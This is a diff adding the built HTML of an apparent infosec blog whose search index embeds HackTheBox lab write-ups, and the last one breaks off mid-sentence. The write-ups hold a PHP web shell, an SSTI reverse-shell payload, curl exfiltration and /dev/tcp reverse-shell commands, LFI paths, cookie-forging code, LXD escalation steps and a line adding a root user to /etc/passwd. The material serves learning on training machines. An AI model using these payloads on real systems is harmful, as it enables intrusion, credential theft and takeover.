@@ -1,0 +1,912 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Infosec Website by  | PCW3R</title>
+
+    <!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Infosec Website by | PCW3R</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Infosec Website by" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Teach and share you techniques used by the hackers through pentest labs and challenges." />
+<meta property="og:description" content="Teach and share you techniques used by the hackers through pentest labs and challenges." />
+<meta property="og:site_name" content="PCW3R" />
+<link rel="next" href="/page2" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Infosec Website by" />
+<script type="application/ld+json">
+{"description":"Teach and share you techniques used by the hackers through pentest labs and challenges.","@type":"WebSite","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/assets/images/logo.png"}},"url":"/","headline":"Infosec Website by","name":"PCW3R","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <link rel="shortcut icon" type="image/x-icon" href="/assets/images/favicon.ico">
+
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous">
+
+    <!-- Google Fonts-->
+    <link href="https://fonts.googleapis.com/css?family=Lora:400,400i,700" rel="stylesheet">
+
+    <!-- Bootstrap Modified -->
+    <link rel="stylesheet" href="/assets/css/main.css">
+
+    <!-- Theme Stylesheet -->
+    <link rel="stylesheet" href="/assets/css/theme.css">
+
+    <!-- Jquery on header to make sure everything works, the rest  of the scripts in footer for fast loading -->
+    <script
+    src="https://code.jquery.com/jquery-3.3.1.min.js"
+    integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
+    crossorigin="anonymous"></script>
+
+    <!-- This goes before </head> closing tag, Google Analytics can be placed here --> 
+
+
+</head>
+
+<body class=" homefirstpage ">
+
+    <!-- Navbar -->
+    <nav id="MagicMenu" class="topnav navbar navbar-expand-lg navbar-light bg-white fixed-top">
+    <div class="container">
+        <a class="navbar-brand" href="/index.html"><strong>PCW3R</strong></a>
+        <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarColor02" aria-controls="navbarColor02" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="navbar-collapse collapse" id="navbarColor02" style="">
+            <ul class="navbar-nav mr-auto d-flex align-items-center">
+               <!--  Replace menu links here -->
+
+<li class="nav-item">
+<a class="nav-link" href="/index.html">Home</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" href="/authors-list.html">Authors</a>
+</li>
+
+            </ul>
+            <ul class="navbar-nav ml-auto d-flex align-items-center">
+                <script src="/assets/js/lunr.js"></script>
+
+<script>
+$(function() {
+    $("#lunrsearchresults").on('click', '#btnx', function () {
+        $('#lunrsearchresults').hide( 1000 );
+        $( "body" ).removeClass( "modal-open" );
+    });
+});
+    
+
+var documents = [{
+    "id": 0,
+    "url": "/404/",
+    "title": "",
+    "body": " 404 Page not found :(  The requested page could not be found. "
+    }, {
+    "id": 1,
+    "url": "/about.html",
+    "title": "About",
+    "body": "Made with by Sal @wowthemesnet. "
+    }, {
+    "id": 2,
+    "url": "/author-jane.html",
+    "title": "Jane",
+    "body": "                        {{page. title}} Follow:         {{ site. authors. jane. site }}         {{ site. authors. jane. bio }}                                   Posts by {{page. title}}:       {% assign posts = site. posts | where: author , jane  %}      {% for post in posts %}      {% include main-loop-card. html %}      {% endfor %}  "
+    }, {
+    "id": 3,
+    "url": "/author-sal.html",
+    "title": "Sal",
+    "body": "                        {{page. title}} Follow:         {{ site. authors. sal. site }}         {{ site. authors. sal. bio }}                                   Posts by {{page. title}}:       {% assign posts = site. posts | where: author , sal  %}      {% for post in posts %}      {% include main-loop-card. html %}      {% endfor %}  "
+    }, {
+    "id": 4,
+    "url": "/authors-list.html",
+    "title": "Authors",
+    "body": "{{page. title}}:     {% for author in site. authors %}                                         {{ author[1]. name }} :       (View Posts)      {{ author[1]. bio }}                          &nbsp;       &nbsp;                                    {% endfor %}  "
+    }, {
+    "id": 5,
+    "url": "/buy-me-a-coffee.html",
+    "title": "Buy me a coffee",
+    "body": "Hi! I am Sal, web designer &amp; developer at WowThemes. net. The free items I create are my side projects and Mundana for Jekyll is one of them. You can find all the work I release for free here. You have my permission to use the free items I develop in your personal, commercial or client projects. If you’d like to reward my work, I would be honored and I could dedicate more time maintaining the free projects. Thank you so much! Buy me a coffee "
+    }, {
+    "id": 6,
+    "url": "/categories.html",
+    "title": "Categories",
+    "body": "          Categories          {% for category in site. categories %}     {{ category[0] }}:           {% assign pages_list = category[1] %}    {% for post in pages_list %}    {% if post. title != null %}     {% if group == null or group == post. group %}           {% include main-loop-card. html %}     {% endif %}    {% endif %}    {% endfor %}    {% assign pages_list = nil %}    {% assign group = nil %}    {% endfor %}                  {% include sidebar-featured. html %}          "
+    }, {
+    "id": 7,
+    "url": "/",
+    "title": "Infosec Website by ",
+    "body": "                Disclaimer: All information exposed in this blog has the goal to teach you techniques used by the hackers through pentest labs and challenges provided by training platforms such as HackTheBox, RootMe or TryHackMe. Write-ups provided on this blog is for informational and educational purpose only. It's your responsibility if you decide to use informations of this blog to make illegal actions.              {% if page. url ==  /  %}        {% assign latest_post = site. posts[0] %}          &lt;div class= topfirstimage  style= background-image: url({% if latest_post. image contains  ://  %}{{ latest_post. image }}{% else %} {{site. baseurl}}/{{ latest_post. image}}{% endif %}); height: 200px;  background-size: cover;  background-repeat: no-repeat; &gt;&lt;/div&gt;           {{ latest_post. title }}  :           		    										{% for tag in latest_post. tags %}				{{ tag | downcase }}				{% endfor %}								       In         {% for category in latest_post. categories %}        {{ category }},         {% endfor %}                       {{ latest_post. date | date: '%b %d, %Y' }}                            {%- assign second_post = site. posts[1] -%}                        {% if second_post. image %}                         &lt;img class= w-100  src= {% if second_post. image contains  ://  %}{{ second_post. image }}{% else %}{{ second_post. image | absolute_url }}{% endif %}  alt= {{ second_post. title }} &gt;                        {% endif %}                                    {{ second_post. title }}          :                       In             {% for category in second_post. categories %}            {{ category }},             {% endfor %}                                                      {{ second_post. date | date: '%b %d, %Y' }}                                    {%- assign third_post = site. posts[2] -%}                        {% if third_post. image %}                         &lt;img class= w-100  src= {% if third_post. image contains  ://  %}{{ third_post. image }}{% else %}{{site. baseurl}}/{{ third_post. image }}{% endif %}  alt= {{ third_post. title }} &gt;                        {% endif %}                                    {{ third_post. title }}          :                       In             {% for category in third_post. categories %}            {{ category }},             {% endfor %}                                                      {{ third_post. date | date: '%b %d, %Y' }}                                    {%- assign fourth_post = site. posts[3] -%}                        {% if fourth_post. image %}                        &lt;img class= w-100  src= {% if fourth_post. image contains  ://  %}{{ fourth_post. image }}{% else %}{{site. baseurl}}/{{ fourth_post. image }}{% endif %}  alt= {{ fourth_post. title }} &gt;                        {% endif %}                                    {{ fourth_post. title }}          :                       In             {% for category in fourth_post. categories %}            {{ category }},             {% endfor %}                                                      {{ fourth_post. date | date: '%b %d, %Y' }}                                  {% for post in site. posts %} {% if post. tags contains  sticky  %}                    {{post. title}}                  {{ post. excerpt | strip_html | strip_newlines | truncate: 136 }}                 Read More            	             {% endif %}{% endfor %}  {% endif %}                All Writeups:         {% for post in paginator. posts %}          {% include main-loop-card. html %}        {% endfor %}                   {% if paginator. total_pages &gt; 1 %}              {% if paginator. previous_page %}        &laquo; Prev       {% else %}        &laquo;       {% endif %}       {% for page in (1. . paginator. total_pages) %}        {% if page == paginator. page %}        {{ page }}        {% elsif page == 1 %}        {{ page }}        {% else %}        {{ page }}        {% endif %}       {% endfor %}       {% if paginator. next_page %}        Next &raquo;       {% else %}        &raquo;       {% endif %}            {% endif %}                     {% include sidebar-featured. html %}      "
+    }, {
+    "id": 8,
+    "url": "/privacy-policy.html",
+    "title": "Privacy Policy",
+    "body": "”{{site. name}}” takes your privacy seriously. To better protect your privacy we provide this privacy policy notice explaining the way your personal information is collected and used. Collection of Routine Information: This website track basic information about their visitors. This information includes, but is not limited to, IP addresses, browser details, timestamps and referring pages. None of this information can personally identify specific visitor to this website. The information is tracked for routine administration and maintenance purposes. Cookies: Where necessary, this website uses cookies to store information about a visitor’s preferences and history in order to better serve the visitor and/or present the visitor with customized content. Advertisement and Other Third Parties: Advertising partners and other third parties may use cookies, scripts and/or web beacons to track visitor activities on this website in order to display advertisements and other useful information. Such tracking is done directly by the third parties through their own servers and is subject to their own privacy policies. This website has no access or control over these cookies, scripts and/or web beacons that may be used by third parties. Learn how to opt out of Google’s cookie usage. Links to Third Party Websites: We have included links on this website for your use and reference. We are not responsible for the privacy policies on these websites. You should be aware that the privacy policies of these websites may differ from our own. Security: The security of your personal information is important to us, but remember that no method of transmission over the Internet, or method of electronic storage, is 100% secure. While we strive to use commercially acceptable means to protect your personal information, we cannot guarantee its absolute security. Changes To This Privacy Policy: This Privacy Policy is effective and will remain in effect except with respect to any changes in its provisions in the future, which will be in effect immediately after being posted on this page. We reserve the right to update or change our Privacy Policy at any time and you should check this Privacy Policy periodically. If we make any material changes to this Privacy Policy, we will notify you either through the email address you have provided us, or by placing a prominent notice on our website. Contact Information: For any questions or concerns regarding the privacy policy, please contact us here. "
+    }, {
+    "id": 9,
+    "url": "/tags.html",
+    "title": "Tags",
+    "body": "          Tags          {% for tag in site. tags %}     {{ tag[0] }}:           {% assign pages_list = tag[1] %}    {% for post in pages_list %}    {% if post. title != null %}     {% if group == null or group == post. group %}           {% include main-loop-card. html %}     {% endif %}    {% endif %}    {% endfor %}    {% assign pages_list = nil %}    {% assign group = nil %}    {% endfor %}                  {% include sidebar-featured. html %}          "
+    }, {
+    "id": 10,
+    "url": "/robots.txt",
+    "title": "",
+    "body": "      Sitemap: {{ “sitemap. xml”   absolute_url }}   "
+    }, {
+    "id": 11,
+    "url": "/page2/",
+    "title": "Infosec Website by ",
+    "body": "                Disclaimer: All information exposed in this blog has the goal to teach you techniques used by the hackers through pentest labs and challenges provided by training platforms such as HackTheBox, RootMe or TryHackMe. Write-ups provided on this blog is for informational and educational purpose only. It's your responsibility if you decide to use informations of this blog to make illegal actions.              {% if page. url ==  /  %}        {% assign latest_post = site. posts[0] %}          &lt;div class= topfirstimage  style= background-image: url({% if latest_post. image contains  ://  %}{{ latest_post. image }}{% else %} {{site. baseurl}}/{{ latest_post. image}}{% endif %}); height: 200px;  background-size: cover;  background-repeat: no-repeat; &gt;&lt;/div&gt;           {{ latest_post. title }}  :           		    										{% for tag in latest_post. tags %}				{{ tag | downcase }}				{% endfor %}								       In         {% for category in latest_post. categories %}        {{ category }},         {% endfor %}                       {{ latest_post. date | date: '%b %d, %Y' }}                            {%- assign second_post = site. posts[1] -%}                        {% if second_post. image %}                         &lt;img class= w-100  src= {% if second_post. image contains  ://  %}{{ second_post. image }}{% else %}{{ second_post. image | absolute_url }}{% endif %}  alt= {{ second_post. title }} &gt;                        {% endif %}                                    {{ second_post. title }}          :                       In             {% for category in second_post. categories %}            {{ category }},             {% endfor %}                                                      {{ second_post. date | date: '%b %d, %Y' }}                                    {%- assign third_post = site. posts[2] -%}                        {% if third_post. image %}                         &lt;img class= w-100  src= {% if third_post. image contains  ://  %}{{ third_post. image }}{% else %}{{site. baseurl}}/{{ third_post. image }}{% endif %}  alt= {{ third_post. title }} &gt;                        {% endif %}                                    {{ third_post. title }}          :                       In             {% for category in third_post. categories %}            {{ category }},             {% endfor %}                                                      {{ third_post. date | date: '%b %d, %Y' }}                                    {%- assign fourth_post = site. posts[3] -%}                        {% if fourth_post. image %}                        &lt;img class= w-100  src= {% if fourth_post. image contains  ://  %}{{ fourth_post. image }}{% else %}{{site. baseurl}}/{{ fourth_post. image }}{% endif %}  alt= {{ fourth_post. title }} &gt;                        {% endif %}                                    {{ fourth_post. title }}          :                       In             {% for category in fourth_post. categories %}            {{ category }},             {% endfor %}                                                      {{ fourth_post. date | date: '%b %d, %Y' }}                                  {% for post in site. posts %} {% if post. tags contains  sticky  %}                    {{post. title}}                  {{ post. excerpt | strip_html | strip_newlines | truncate: 136 }}                 Read More            	             {% endif %}{% endfor %}  {% endif %}                All Writeups:         {% for post in paginator. posts %}          {% include main-loop-card. html %}        {% endfor %}                   {% if paginator. total_pages &gt; 1 %}              {% if paginator. previous_page %}        &laquo; Prev       {% else %}        &laquo;       {% endif %}       {% for page in (1. . paginator. total_pages) %}        {% if page == paginator. page %}        {{ page }}        {% elsif page == 1 %}        {{ page }}        {% else %}        {{ page }}        {% endif %}       {% endfor %}       {% if paginator. next_page %}        Next &raquo;       {% else %}        &raquo;       {% endif %}            {% endif %}                     {% include sidebar-featured. html %}      "
+    }, {
+    "id": 12,
+    "url": "/posts/HTB-19-Pentest-Breadcrumbs/",
+    "title": "Breadcrumbs - Let me steal your web session!",
+    "body": "2021/07/17 - Breadcrumbs is a vulnerable machine through :  Foothold &gt; Cookie Hijacking from LFI in php files Lateral movement &gt; Reusing credentials plaintext Privilege Escalation &gt; SQL Injection in Password Manager `ReconnaissanceNetwork Service Scanning: Website on port 80 / 443: http://10. 10. 10. 228/ Website Directory scanning: Website Fuzzing: $ wfuzz -w /usr/share/wordlists/dirb/big. txt --hc 404,403 http://10. 10. 10. 228/portal/FUZZ. php Public file and directory: Publicly available upload file: https://10. 10. 10. 228/portal/uploads/ We get list of all users from admins. php. Only 3 users are active: John, Olivia and Paul http://10. 10. 10. 228/portal/php/admins. php Login page and portal access: http://10. 10. 10. 228/portal/login. php http://10. 10. 10. 228/portal/ We get here privilege of each users. So if we combine with previous information about users, we can target next user : Paul (because he is an admin and his session is still active). http://10. 10. 10. 228/portal/php/users. php The page issues. php reveal a hint about PHPSESSID …. let’s start to find way around this. http://10. 10. 10. 228/portal/php/issues. php Local File Inclusion from php files: When we search book or anything from bookController. php we have possibility to generate an error with &amp;method=1 in request and this allow the reveal of array key Book and action file_get_contents(. . /books/).  We test LFI to get php. ini and it’s work! book=. . /. . /. . /. . /. . /. . /Users/www-data/Desktop/xampp/php/php. ini&amp;method=1 We recover the secret_key from authController. php to generate TOKEN: 6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e Reference: https://extendsclass. com/php. html &lt;?php require 'db\/db. php';require \ cookie. php\ ;require \ vendor\/autoload. php\ ;use \Firebase\JWT\JWT;$errors = array();$username = \ \ ;$userdata = array();$valid = false;$IP = $_SERVER['REMOTE_ADDR'];\/\/if user clicks on loginif($_SERVER['REQUEST_METHOD'] === \ POST\ ){  if($_POST['method'] == 0){    $username = $_POST['username'];    $password = $_POST['password'];        $query = \ SELECT username,position FROM users WHERE username=? LIMIT 1\ ;    $stmt = $con-&gt;prepare($query);    $stmt-&gt;bind_param('s', $username);    $stmt-&gt;execute();    $result = $stmt-&gt;get_result();    while ($row = $result-&gt;fetch_array(MYSQLI_ASSOC)){      array_push($userdata, $row);    }    $userCount = $result-&gt;num_rows;    $stmt-&gt;close();    if($userCount &gt; 0){      $password = sha1($password);      $passwordQuery = \ SELECT * FROM users WHERE password=? AND username=? LIMIT 1\ ;      $stmt = $con-&gt;prepare($passwordQuery);      $stmt-&gt;bind_param('ss', $password, $username);      $stmt-&gt;execute();      $result = $stmt-&gt;get_result();      if($result-&gt;num_rows &gt; 0){        $valid = true;      }      $stmt-&gt;close();    }    if($valid){      session_id(makesession($username));      session_start();      $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';      $data = array();      $payload = array(        \ data\  =&gt; array(          \ username\  =&gt; $username      ));      $jwt = JWT::encode($payload, $secret_key, 'HS256');            setcookie(\ token\ , $jwt, time() + (86400 * 30), \ \/\ );      $_SESSION['username'] = $username;      $_SESSION['loggedIn'] = true;      if($userdata[0]['position'] == \ \ ){        $_SESSION['role'] = \ Awaiting approval\ ;      }       else{        $_SESSION['role'] = $userdata[0]['position'];      }            header(\ Location: \/portal\ );    }    else{      $_SESSION['loggedIn'] = false;      $errors['valid'] = \ Username or Password incorrect\ ;    }  }  elseif($_POST['method'] == 1){    $username=$_POST['username'];    $password=$_POST['password'];    $passwordConf=$_POST['passwordConf'];        if(empty($username)){      $errors['username'] = \ Username Required\ ;    }    if(strlen($username) &lt; 4){      $errors['username'] = \ Username must be at least 4 characters long\ ;    }    if(empty($password)){      $errors['password'] = \ Password Required\ ;     }    if($password !== $passwordConf){      $errors['passwordConf'] = \ Passwords don't match!\ ;     }    $userQuery = \ SELECT * FROM users WHERE username=? LIMIT 1\ ;    $stmt = $con-&gt;prepare($userQuery);    $stmt -&gt;bind_param('s',$username);    $stmt-&gt;execute();    $result = $stmt-&gt;get_result();    $userCount = $result-&gt;num_rows;    $stmt-&gt;close();    if($userCount &gt; 0){      $errors['username'] = \ Username already exists\ ;    }    if(count($errors) === 0){      $password = sha1($password);      $sql = \ INSERT INTO users(username, password, age, position) VALUES (?,?, 0, '')\ ;      $stmt = $con-&gt;prepare($sql);      $stmt -&gt;bind_param('ss', $username, $password);      if ($stmt-&gt;execute()){        $user_id = $con-&gt;insert_id;        header('Location: login. php');      }      else{        $_SESSION['loggedIn'] = false;        $errors['db_error']=\ Database error: failed to register\ ;      }    }  }} ?&gt; We recover the key from cookie. php to generate PHPSESSID: s4lTy_stR1nG_ &lt;?php\/** * @param string $username Username requesting session cookie * * @return string $session_cookie Returns the generated cookie * * @devteam * Please DO NOT use default PHPSESSID; our security team says they are predictable. * CHANGE SECOND PART OF MD5 KEY EVERY WEEK * *\/function makesession($username){  $max = strlen($username) - 1;  $seed = rand(0, $max);  $key = \ s4lTy_stR1nG_\ . $username[$seed]. \ (!528. \/9890\ ;  $session_cookie = $username. md5($key);  return $session_cookie;} ?&gt; FootholdCookie Hijacking: To get into the target, we use Cookie Hijacking method on Paul session. I test with my user to understand how PHPSESSID is generated and adapt the php script to show me all value of PHPSESSID: Reference: https://www. unphp. net/decode/61dd1e1d6f02265102ec45fb408016c0/ &lt;?php$username =  privuser45 ;$max = strlen($username) - 1;$rota =[];do {  $seed = rand(0, $max); $key =  s4lTy_stR1nG_ . $username[$seed].  (!528. /9890 ; $session_cookie = $username. md5($key);  if (!in_array($seed,$rota)) {  var_dump($session_cookie);  $rota[] = $seed;  } }while (count($rota) &lt;= $max); We test now with user Paul and get 4 values of PHPSESSID. Only 1 is good reference of active session.  To finalize the action, we generate the JWT token from jwt. io site with the secret_key: References:  https://owasp. org/www-chapter-vancouver/assets/presentations/2020-01_Attacking_and_Securing_JWT. pdf https://jwt. io/ https://www. codementor. io/@byjg/using-json-web-token-jwt-as-a-php-session-axeuqbg1m We need to test now all PHPSESSID with token and the good one is: paul47200b180ccd6835d25d034eeb6e6390 So we have the following ID Session of Admin Paul: PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9. eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ. 7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU Uploading webshell and tool: We have now privilege to upload on website, with only zip restriction. I test to upload webshell with . html extension and change it to . php into burp. &lt;html&gt;&lt;body&gt;&lt;form method= GET  name= &lt;?php echo basename($_SERVER['PHP_SELF']); ?&gt; &gt;&lt;input type= TEXT  name= cmd  id= cmd  size= 80 &gt;&lt;input type= SUBMIT  value= Execute &gt;&lt;/form&gt;&lt;pre&gt;&lt;?php  if(isset($_GET['cmd']))  {    system($_GET['cmd']);  }?&gt;&lt;/pre&gt;&lt;/body&gt;&lt;script&gt;document. getElementById( cmd ). focus();&lt;/script&gt;&lt;/html&gt; And it’s work, we have possibility now from uploads path to test if webshell works.  I decide to upload nc. zip and extract with powershell command.  Get reverse shell: Execute command to get a reverse shell.  Lateral MovementEnumeration and find plaintext Password of Juliette: Recover Sqlite db of Sticky Notes App and find plaintext Password of Developpement: We get interesting note from Juliette workspace: Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager and It stores passwords in plain text. Reference: https://github. com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation. md#sticky-notes-passwords We download db of the stiky note and retrieve plaintext passowrd of Juliette and Developpement. $ scp juliette@10. 10. 10. 228:/C:/Users/juliette/AppData/Local/Packages/Microsoft. MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/* . Check Krypter_Linux: Krypter_Linux is ELF 64-bit LSB pie executable, so i decide to reverse with gbd but no success … Check with strings command reveal interesting information about future release and features. And link reference of Password Manager http://passmanager. htb:1234/index. php Local box listen on this port, so we need to use ssh tunneling / local port forwarding to see and request with method=select&amp;username=administrator&amp;table=passwords Privilege EscalationSQL Injection in Password Manager: $ ssh -l juliette 10. 10. 10. 228 -L 1234:127. 0. 0. 1:1234 cURL command with method reveal AES_Key. $ curl 'http://passmanager. htb:1234/index. php?method=select&amp;username=administrator&amp;table=passwords' Show all columns of table passwords in database bread: $ sqlmap 'http://passmanager. htb:1234/index. php?method=select&amp;username=administrator&amp;table=passwords' --columns Dump values of columns accounts, aes_key, id and password for administrator: $ sqlmap 'http://passmanager. htb:1234/index. php?method=select&amp;username=administrator&amp;table=passwords' -C account,aes_key,id,password --dump  "
+    }, {
+    "id": 13,
+    "url": "/posts/HTB-18-Pentest-Doctor/",
+    "title": "Write-up Doctor Machine",
+    "body": "2021/02/04 - Ref°: HTB-18-Machine — Doctor is a vulnerable machine through :  Foothold : Server Side Template Injection Lateral movement : Credential in log file Prives : Abusing Splunk Forwarder[1] Discovery - Figure out environment: Network Service Scanning: We have the 3 following open ports : 22, 80, 8089 Website on port 80: http://10. 10. 10. 209/ Docteur Secure Messaging on port 80: Other page can be resolve with doctors. htb: http://doctors. htb/login?next=%2F Splunk Forwarder on port 8089: https://doctors. htb:8089/ [2] Weaponization - Find exploit way: Archive page under beta testing: Reference: https://portswigger. net/web-security/server-side-template-injection Source page reveal page under beta testing: This page is empty: But we can register new account and post anywant:  And this archive page are updated with our post: We can determine the using of template language programmation in this website.  The payload returns 7777777 and we can identify template used here: Jinja2 [3] Foothold - Get into the target : Server Side Template Injection with Jinja2: Reference: https://github. com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection Get remote file: . . get_flashed_messages. __globals__. __builtins__. open( /etc/passwd ). read() . . Gain RCE: . . ['__import__']('os'). popen( python3 -c 'import socket,subprocess,os;s=socket. socket(socket. AF_INET,socket. SOCK_STREAM);s. connect((\ IP\ ,PORT));os. dup2(s. fileno(),0); os. dup2(s. fileno(),1); os. dup2(s. fileno(),2);p=subprocess. call([\ /bin/bash\ , \ -i\ ]);' ). read(). zfill(417) . . [4] Lateral Movement - Move through environment: Linpeas reveal password in /var/log/backup:       ![Desktop View]({ “/assets/images/doctor/HTB-Images-Doctor-linpeas. png”   relative_url })   su Shaun: Username: ShaunPassword: Guitar123 [5] Privilege Escalation - Gain higher-level permissions: Abusing Splunk Forwarders: References:  https://eapolsniper. github. io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/ https://github. com/cnotin/SplunkWhisperer2Shaun account is used like UF agent –&gt; we can run arbitrary command on the server as root.  Get root flag: $ python3 PySplunkWhisperer2_remote. py --host doctors. htb --port XXXX --username XXXX --password XXXX --payload  curl -F 'data=@/root/root. txt' http://IP:PORT  --lhost IP Gain RCE: $ python3 PySplunkWhisperer2_remote. py --host doctors. htb --port XXXX --username XXXX --password XXXX --payload  bash -c 'bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1'  --lhost IP Trophy I don’t know how to put this but I’m kind of a big deal. People know me. I’m very important. I have many leather-bound books and my apartment smells of rich mahogany  Ron Burgundy "
+    }, {
+    "id": 14,
+    "url": "/posts/HTB-17-Pentest-Tabby/",
+    "title": "Write-up Tabby Machine",
+    "body": "2020/11/07 - Ref°: HTB-17-Machine — Tabby is a vulnerable machine through LFI in tomcat service and the reuse of a password to get into the target. Privesc is possible from container LXD exploitation.  [1] Discovery - Figure out environment: Network Service Scanning: We have the 4 following open ports : 22, 80, 8080 and 4446 Website on port 80: We have website present on port 80.  THe main page reveal “We apologise to all our customers for the previous data breach. We have changed the site to remove this tool, and have invested heavily in more secure servers. ” Interesting page : http://megahosting. htb/news. php Tomcat service on port 8080: Interesting paths who need authentication :  http://10. 10. 10. 194:8080/host-manager/html http://10. 10. 10. 194:8080/manager/html [2] Weaponization - Find exploit way: Fuzzing and LFI in Tomcat service: Reference : https://outpost24. com/blog/from-local-file-inclusion-to-remote-code-execution-part-1 Tomcat is vulnerable to LFI attack. We using this technique to recover sensitive information. Grab passwd file for example :  We know that Tomcat service has interesting information in its file “tomcat-users. xml” and the location seem to be in $CATALINA_HOME : /usr/share/tomcat9/conf/tomcat-users. xml Fuzzing method can help us to search the good location of this file. Reference : https://wfuzz. readthedocs. io/en/latest/user/advanced. html Result success on folder etc and get the file : wget http://10. 10. 10. 194/news. php?file=. . /. . /. . /. . /. . /. . /usr/share/tomcat9/FUZZ/tomcat-users. xmlPlaintext password and rolename! The role rolename=”manager-script allows access to the text interface and the status pages only. We have the possibility to connect now on host-manager but we can’t exploit anything.  [3] Foothold - Get into the target : Deploy malicious remote script on tomcat manager: Reference : https://stackoverflow. com/questions/4432684/tomcat-manager-remote-deploy-script  We launch this new script from URL : http://10. 10. 10. 194/privuser45 [4] Lateral Movement - Move through environment: Recover archive backup: Archive file backup present under website folders. We recover it to try finding anything inside. wget http://10. 10. 10. 194/files/16162020_backup. zipCracking archive password:  Reusing password of ash user: ash user reuse this password and we can connect on from “su” command.  [5] Privilege Escalation - Gain higher-level permissions: Enumeration: Many interesting information about lxd from linpeas enumeration.   Container LXD Exploitation: References :  https://www. hackingarticles. in/lxd-privilege-escalation/ https://www. exploit-db. com/exploits/46978 https://github. com/saghul/lxd-alpine-builderThe solution : mount root path in container with lxd alpine builder From offensive machine : git clone https://github. com/saghul/lxd-alpine-builder. gitcd lxd-alpine-builder. /build-alpineFrom victim machine : wget 10. 10. 14. 67:1337/alpine-v3. 12-x86_64-20200906_1836. tar. gzlxc image import alpine-v3. 12-x86_64-20200906_1836. tar. gz --alias privuser45 &amp;&amp; lxd init --autolxc image listlxc init privuser45 privesc -c security. privileged=truelxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=truelxc start privesclxc exec privesc sh  And we start our malicious container containing root path in /mnt/root/root .  Bruteforce with johntheripper :: root:$6$86Nxy4plrFeu0w4C$IfFB5j7BEbjBrUOtkmxyfUZ0lnNIxAcFn3meuvjGqFPSIogXynKx9FU1w3XJIC60rvwuKcg6feaeBqcNWMO0H/:18429:0:99999:7:::root:x:0:0:root:/root:/bin/bash#### Add malicious user with root privilege :Reference : https://hacknpentest. com/linux-privilege-escalation-via-writeable-etc-passwd-file/ perl -le 'print crypt( Password@973 , addedsalt )'echo  privuser45:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash  &gt;&gt; /mnt/root/etc/passwdlxc delete privesc &amp;&amp; lxc image delete privuser45 Trophy If you can’t give me poetry, can’t you give me poetical science?  Ada Lovelace "
+    }, {
+    "id": 15,
+    "url": "/posts/HTB-16-Pentest-Admirer/",
+    "title": "Write-up Admirer Machine",
+    "body": "2020/09/26 - Ref°: HTB-16-Machine — Admirer is a vulnerable machine through web and database exploitation to gain foothold. Once on the victim machine, we escalate privilege through Sudo permission and Python library Hijacking from admin script execution under root privilege.  [1] Discovery - Figure out environment: Network Service Scanning: We find interesting services ftp, web and ssh on their usual ports. $ nmap -A -T5 10. 10. 10. 187 -p- Robots. txt: The robots. txt file make reference about inindexable path admin-dir. This folder contains apparently “personal contacts” and “creds”.  Fuzzing Website: We fuzzing Website with seclists wordlist to recover two notes contacts. txt and credentials. txt: $ wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/big. txt --hc 404,403 http://10. 10. 10. 187/admin-dir/FUZZ. txt From http://10. 10. 10. 187/admin-dir/contacts. txt, the note reveal 5 mailbox with associated usernames and job title.  And from http://10. 10. 10. 187/admin-dir/credentials. txt we discover passwords : File Transfert Protocol: We use the FTP account find above to recover dump. sql and html. tar. gz.  The dump SQL show us interesting informations about : From html archive, we find new credential waldo. 11 : Ezy]m27}OREc$ in . . /w4ld0s_s3cr3t_d1r/credentials. txt : And an other credential set waldo : Wh3r3_1s_w4ld0? in . . /utility-scripts/db_admin. php : Adminer tool: php file reveal interesting information about an alternative to php database. // TODO: Finish implementing this or find a better open source alternativeWe find following site with Google search https://alternativeto. net/software/phpmyadmin/ Directly match wich alternative tool is used : Admirer = Adminer And can confirm this to check : http://10. 10. 10. 187/utility-scripts/adminer. php [2] Weaponization - Find exploit way: Adminer v4. 6. 2: Adminer is a popular PHP tool to administer MySQL and PostgreSQL databases. The version 4. 6. 2 contain a security hole that allowing them to read files on servers using the LOAD DATA LOCAL INFILE statement. Attackers can abuse that to fetch passwords for popular apps such as Magento and Wordpress, and gain control of a site’s database. Reference exploit : https://www. foregenix. com/blog/serious-vulnerability-discovered-in-adminer-tool Preparation of MySQL database hosted: Database creation: Database configuration: Database connection: Table creation to receipt data from victim server: We are ready! [3] Foothold - Get into the target : Adminer exploitation: Using the MySQL command LOAD DATA LOCAL to specifying a local file on the victim server. This command is used to load data from a file local to the Adminer instance, into a database.  And we recover new password from files stealing: We can now connect to adminer database of victim server:  Reusing Password on remote service SSH: But waldo user use the same password to login SSH service: Flag user: [4] Privilege Escalation - Gain higher-level 